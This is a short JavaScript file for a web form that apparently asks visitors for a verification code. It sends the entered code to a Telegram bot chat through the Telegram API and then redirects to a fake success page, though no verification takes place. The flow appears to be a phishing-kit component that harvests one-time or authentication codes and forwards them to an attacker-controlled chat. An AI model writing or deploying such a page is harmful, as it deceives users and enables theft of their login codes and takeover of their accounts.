const form = document.querySelector('#message-form');
const input = document.querySelector('#message');
const button = document.querySelector('#send');
const status = document.querySelector('#status');

input.addEventListener('input', () => {
  const counter = document.querySelector('#count');
  if (counter) counter.textContent = input.value.length;
  input.setCustomValidity('');
});

form.addEventListener('submit', async (event) => {
  event.preventDefault();
  if (!input.value.trim()) {
    input.setCustomValidity('Please enter a code before verifying.');
    input.reportValidity();
    return;
  }

  const config = window.TELEGRAM_CONFIG || {};
  if (!config.BOT_TOKEN || config.BOT_TOKEN === 'tu_bot_token_aqui' || !config.CHAT_ID || config.CHAT_ID === 'tu_chat_id_aqui') {
    status.className = 'status error';
    status.textContent = 'Configure BOT_TOKEN and CHAT_ID in config.js first.';
    return;
  }

  button.disabled = true;
  button.textContent = 'Sending…';
  if (status) status.textContent = '';

  try {
    const response = await fetch(`https://api.telegram.org/bot${config.BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: config.CHAT_ID,
        text: input.value
      })
    });
    const data = await response.json();
    if (!response.ok || !data.ok) {
      throw new Error(data.description || 'Could not send.');
    }
    // Go to blank page with green check animation only
    window.location.href = 'success.html';
  } catch (error) {
    status.className = 'status error';
    status.textContent = error.message || 'Could not connect. Please try again.';
    button.disabled = false;
    button.textContent = 'Verify';
  }
});
